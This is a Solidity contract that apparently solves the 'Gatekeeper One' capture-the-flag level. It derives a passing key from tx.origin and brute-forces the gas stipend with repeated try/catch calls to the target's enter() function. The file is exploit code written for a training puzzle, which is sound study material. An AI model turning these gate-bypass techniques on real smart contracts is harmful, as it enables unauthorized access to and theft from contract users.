// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./14_Gatekeeper One.sol";

contract Attack {
    GatekeeperOne gatekeeperOne;

    constructor(address payable _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack() public {
        uint16 gatePasskey = uint16(uint160(tx.origin));
        uint64 key2 = uint64(1 << 63) + uint64(gatePasskey);
        bytes8 key = bytes8(uint64(key2));
        // require(gas < 8191, "8191 gas is greater");
        // require(gatekeeperOne.enter{gas: 800000 + gas}(key), "Wrong key");
        for (uint256 i = 0; i <= 8191; i++) {
            try gatekeeperOne.enter{gas: 800000 + i}(key) {
                break;
            } catch {}
        }
    }

    function getterKey() public view returns (bytes8) {
        uint16 gatePasskey = uint16(uint160(tx.origin));
        bytes8 key = bytes8(uint64(gatePasskey));
        return key;
    }

    function test(uint64 num, uint64 count) public pure returns (uint64) {
        while (count > 0) {
            num = uint64(1) << num;
            count--;
        }

        return uint64(num);
    }
}
